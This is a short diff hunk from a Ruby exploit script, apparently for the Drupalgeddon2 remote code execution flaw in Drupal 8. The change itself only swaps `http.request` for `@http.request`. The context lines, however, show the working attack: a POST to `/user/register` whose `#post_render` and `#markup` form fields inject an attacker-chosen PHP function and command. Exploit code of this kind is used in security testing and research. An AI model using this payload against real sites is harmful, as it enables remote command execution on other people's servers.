@@ -66,7 +66,7 @@ class Drupal8 < Target
 		req = Net::HTTP::Post.new(URI.encode("/user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax"))
 		req.body = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + @method + "&mail[a][#type]=markup&mail[a][#markup]=" + @command
 
-		response = http.request(req)
+		response = @http.request(req)
 		check_response(response)
 		puts response.body
 
